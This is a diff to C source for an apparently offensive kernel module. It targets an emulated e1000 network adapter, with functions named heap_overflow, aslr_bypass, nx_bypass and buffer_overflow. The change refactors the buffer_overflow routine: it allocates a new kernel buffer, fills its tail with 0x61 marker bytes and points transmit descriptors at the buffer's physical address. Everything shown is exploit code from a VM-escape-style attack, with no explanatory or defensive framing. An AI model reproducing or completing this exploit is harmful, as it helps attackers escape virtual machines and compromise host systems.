@@ -38,6 +38,7 @@ static void nx_bypass(void);
 uint8_t* bar0;
 struct e1000_desc* tx_ring;
 uint8_t* tx_buffer;
+static int	idx = 0;
 
 /* ================================== CORE ================================ */
 /* ------------------------------ Constructor ----------------------------- */
@@ -138,7 +139,6 @@ static void e1k_configure(void)
  */
 static void heap_overflow(uint16_t new_addr)
 {
-	static int	idx = 0;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
@@ -330,7 +330,7 @@ static uint64_t aslr_bypass(void)
 
 static void buffer_overflow(void)
 {
-	int			idx = get_register(TDT);
+	uint8_t* buffer;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
@@ -341,20 +341,21 @@ static void buffer_overflow(void)
 	struct e1000_data_desc*		data_5		= 	&(tx_ring[idx+4].data);
 
 	//------------- Payload setup -------------//
-	kfree(tx_buffer);
-	tx_buffer = kmalloc(STACK_LEN, GFP_KERNEL);
-	tx_buffer[STACK_LEN - 8] = 0x61;
-	tx_buffer[STACK_LEN - 7] = 0x61;
-	tx_buffer[STACK_LEN - 6] = 0x61;
-	tx_buffer[STACK_LEN - 5] = 0x61;
-	tx_buffer[STACK_LEN - 4] = 0x61;
-	tx_buffer[STACK_LEN - 3] = 0x61;
-	tx_buffer[STACK_LEN - 2] = 0x61;
-	tx_buffer[STACK_LEN - 1] = 0x61;
+	buffer = kmalloc(STACK_LEN, GFP_KERNEL);
+
+	buffer[STACK_LEN - 8] = 0x61;
+	buffer[STACK_LEN - 7] = 0x61;
+	buffer[STACK_LEN - 6] = 0x61;
+	buffer[STACK_LEN - 5] = 0x61;
+	buffer[STACK_LEN - 4] = 0x61;
+	buffer[STACK_LEN - 3] = 0x61;
+	buffer[STACK_LEN - 2] = 0x61;
+	buffer[STACK_LEN - 1] = 0x61;
 	//-----------------------------------------//
 
 	//----------- Descriptors setup -----------//
-	physical_address = virt_to_phys(tx_buffer);
+	
+	physical_address = virt_to_phys(buffer);
 
 	context_1->lower_setup.ip_config	= 	(uint32_t) 0;
 	context_1->upper_setup.tcp_config	= 	(uint32_t) 0;
